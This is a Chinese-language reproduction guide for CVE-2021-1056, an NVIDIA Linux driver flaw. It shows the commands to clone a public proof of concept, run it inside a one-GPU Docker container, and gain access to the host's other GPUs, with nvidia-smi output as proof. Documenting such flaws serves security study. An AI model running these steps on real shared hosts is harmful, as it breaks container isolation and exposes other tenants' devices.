# NVIDIA GPU显示驱动程序 信息泄露 CVE-2021-1056

## 漏洞描述

用于Linux的NVIDIA GPU显示驱动程序在内核模式层（`nvidia.ko`）中包含一个漏洞，在该漏洞中，它没有完全遵守操作系统文件系统提供GPU设备级隔离的权限，这可能导致拒绝服务或信息泄露。

参考阅读：

- https://github.com/pokerfaceSad/CVE-2021-1056/blob/master/docs/QuickStart.md

## 漏洞影响

```
NVIDIA GPU显示驱动程序
```

## 环境搭建

Dokcer版本: 19.03

```plain
git clone https://github.com/pokerfaceSad/CVE-2021-1056.git
cd CVE-2021-1056
docker run --gpus 1 -v $PWD:/CVE-2021-1056 -it tensorflow/tensorflow:1.13.2-gpu bash
```

## 漏洞复现

进入容器检查 GPU状态，只有一块GPU

```shell
In Container# nvidia-smi
Sat Jan  9 07:21:03 2021       
+-----------------------------------------------------------------------------+
| NVIDIA-SMI 450.51.05    Driver Version: 450.51.05    CUDA Version: 11.0     |
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|                               |                      |               MIG M. |
|===============================+======================+======================|
|   0  Tesla V100-PCIE...  Off  | 00000000:02:00.0 Off |                    0 |
| N/A   27C    P0    23W / 250W |      0MiB / 32510MiB |      0%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+

+-----------------------------------------------------------------------------+
| Processes:                                                                  |
|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |
|        ID   ID                                                   Usage      |
|=============================================================================|
|  No running processes found                                                 |
+-----------------------------------------------------------------------------+
```

在容器中执行漏洞利用脚本，在最后的`nvidia-smi`的输出中可以看到宿主机所有GPU在容器中都已经可见了

```shell
In Container# bash /CVE-2021-1056/main.sh
[INFO] init GPU num: 1
[DEBUG] /dev/nvidia0 exists, skip
[DEBUG] successfully get /dev/nvidia1
[DEBUG] successfully get /dev/nvidia2
[DEBUG] successfully get /dev/nvidia3
[DEBUG] delete redundant /dev/nvidia4
[INFO] get extra 3 GPU devices from host
[INFO] current GPU num: 4
[INFO] exec nvidia-smi:
Sat Jan  9 07:22:43 2021       
+-----------------------------------------------------------------------------+
| NVIDIA-SMI 450.51.05    Driver Version: 450.51.05    CUDA Version: 11.0     |
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|                               |                      |               MIG M. |
|===============================+======================+======================|
|   0  Tesla V100-PCIE...  Off  | 00000000:02:00.0 Off |                    0 |
| N/A   27C    P0    23W / 250W |      0MiB / 32510MiB |      0%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
|   1  Tesla V100-PCIE...  Off  | 00000000:03:00.0 Off |                    0 |
| N/A   30C    P0    25W / 250W |      0MiB / 32510MiB |      0%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
|   2  Tesla V100-PCIE...  Off  | 00000000:82:00.0 Off |                    0 |
| N/A   29C    P0    25W / 250W |      0MiB / 32510MiB |      0%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
|   3  Tesla V100-PCIE...  Off  | 00000000:83:00.0 Off |                    0 |
| N/A   28C    P0    25W / 250W |      0MiB / 32510MiB |      0%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+

+-----------------------------------------------------------------------------+
| Processes:                                                                  |
|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |
|        ID   ID                                                   Usage      |
|=============================================================================|
|  No running processes found                                                 |
+-----------------------------------------------------------------------------+
```

为了验证这些GPU确实是可用的，执行一个tensorflow的demo，可以看到所有的GPU确实可以被容器中的进程使用

```shell
In Container# nohup python /CVE-2021-1056/tf_distr_demo.py > log 2>&1 &
In Container$ nvidia-smi
Sat Jan  9 18:58:23 2021       
+-----------------------------------------------------------------------------+
| NVIDIA-SMI 450.51.05    Driver Version: 450.51.05    CUDA Version: 11.0     |
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|                               |                      |               MIG M. |
|===============================+======================+======================|
|   0  Tesla V100-PCIE...  Off  | 00000000:02:00.0 Off |                    0 |
| N/A   32C    P0    36W / 250W |  31117MiB / 32510MiB |      1%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
|   1  Tesla V100-PCIE...  Off  | 00000000:03:00.0 Off |                    0 |
| N/A   33C    P0    35W / 250W |  31117MiB / 32510MiB |      1%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
|   2  Tesla V100-PCIE...  Off  | 00000000:82:00.0 Off |                    0 |
| N/A   33C    P0    36W / 250W |  31117MiB / 32510MiB |      1%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
|   3  Tesla V100-PCIE...  Off  | 00000000:83:00.0 Off |                    0 |
| N/A   32C    P0    37W / 250W |  31117MiB / 32510MiB |      1%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+

+-----------------------------------------------------------------------------+
| Processes:                                                                  |
|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |
|        ID   ID                                                   Usage      |
|=============================================================================|
+-----------------------------------------------------------------------------+
```

